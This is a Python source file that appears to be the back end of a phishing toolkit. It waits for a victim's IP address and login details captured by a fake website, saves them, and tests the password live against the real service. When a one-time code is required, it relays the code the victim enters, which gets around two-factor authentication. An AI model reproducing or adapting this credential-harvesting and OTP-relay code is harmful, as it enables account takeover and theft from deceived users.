import os 
import sys
import time
from Core import Verification

RED   = "\033[91m"  
RESET = "\033[0;0m"
CYAN='\033[36m'
YELLOW='\033[93m'
GREEN='\033[32m'
PURPLE='\033[35m'

ip = "Core/website/ip.txt"
saveip = "Saved/savedip.txt"
saveuser = "Saved/saveduser.txt"
username = "Core/website/usernames.txt"
temp = "Core/website/temp"
Verificationtxt = "Core/website/Verification.txt"
OTPtxt = "Core/website/OTP.txt"




def finalstore():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print(YELLOW+"\n\n[!]"+CYAN+"Account detail stored in Saved --> saveduser.txt")
    print(r"IP Details stored in Saved --> savedip.txt")
    sys.stdout.write(RED)
    print("\nExiting",end=""),
    for _ in range(7):
        sys.stdout.write(".")
        sys.stdout.flush()
        time.sleep(0.5)
    print("\n\n"+RESET) 


def read(file): 
    f = open(file, "r")
    print(f.read())
    f.close()

def write(source,dest): 
    with open(source,'r') as firstfile, open(dest,'a') as secondfile: 
        for line in firstfile: 
             secondfile.write(line)
    firstfile.close()
    secondfile.close()

def cred():
    print(YELLOW+"\n[!] "+PURPLE+"Waiting for credentials ..")
    while(True):
        if(os.path.exists(username)):
            if(os.path.exists(Verificationtxt)):
                os.remove(Verificationtxt)
            print(YELLOW+"\n[!] "+PURPLE+"Credentials Found: "+GREEN)
            write(username,saveuser)
            read(username)
            sys.stdout.write(RESET)
            with open(username,'r') as f:
                b = f.read().split(" ")
            verify = Verification.PasswrdVerify(b[1],b[3])
            f.close()
            if (verify == "Password Error"):
                os.remove(username)
                with open(Verificationtxt,'w') as H:
                    H.write("PasswordError")
            elif (verify == "OTP"):
                with open(Verificationtxt,'w') as H:
                    H.write("OTP")
                while(True):
                    if os.path.exists(OTPtxt):
                        if(os.path.exists(Verificationtxt)):
                            os.remove(Verificationtxt)
                        print(YELLOW+"\n[!] "+GREEN+"OTP Found: ")
                        read(OTPtxt)
                        R = open(OTPtxt,'r')
                        OTPV = R.read()
                        R.close()
                        OTP_Verify = Verification.OTP(OTPV)
                        if (OTP_Verify == "Error"):
                            os.remove(OTPtxt)
                            with open(Verificationtxt,'w') as H:
                                H.write("Error")
                        elif (OTP_Verify == "Success"):
                            with open(Verificationtxt,'w') as H:
                                H.write("Success")
                            finalstore() 
                            break                      
                break
            elif (verify == "Success"):
                with open(Verificationtxt,'w') as H:
                    H.write("Success")
                finalstore()
                break



def Collector():
    while(True):
        if(os.path.exists(ip)):
            print(YELLOW+"[!] "+GREEN+"Client Found"+RESET)
            write(ip,saveip)
            read(ip)
            cred()
            break
